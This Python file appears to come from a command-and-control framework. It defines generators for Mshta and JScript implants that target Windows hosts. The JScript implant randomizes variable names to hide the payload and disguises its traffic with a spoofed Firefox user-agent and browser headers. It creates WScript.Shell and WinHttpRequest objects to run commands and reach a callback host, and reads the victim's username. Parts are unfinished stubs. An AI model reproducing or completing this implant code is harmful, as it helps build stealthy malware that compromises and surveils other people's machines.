import time

from connect import util

class Implant():

    variables = {}
    functions = {}

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.setup_variables()
        self.setup_functions()

    def setup_variables(self):
        pass

    def setup_functions(self):
        pass


class MshtaImplant(Implant):

    format = 'mshta'

    def __init__(self, ip, port):
        super().__init__(ip, port)


class JScriptImplant(Implant):

    format = 'jscript'
    post_req_func =''

    def __init__(self, ip, port):
        super().__init__(ip, port)

    def setup_functions(self):
        self.functions['post_req'] = (util.generate_str(), self.post_req_func)

    def setup_variables(self):
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
        self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell");')
        self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')

        wscript = self.variables['wscript.shell'][0]
        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')

        #winhttp = self.variables['winhttp.winhttprequest.5.1'][0]
        #self.variables['']
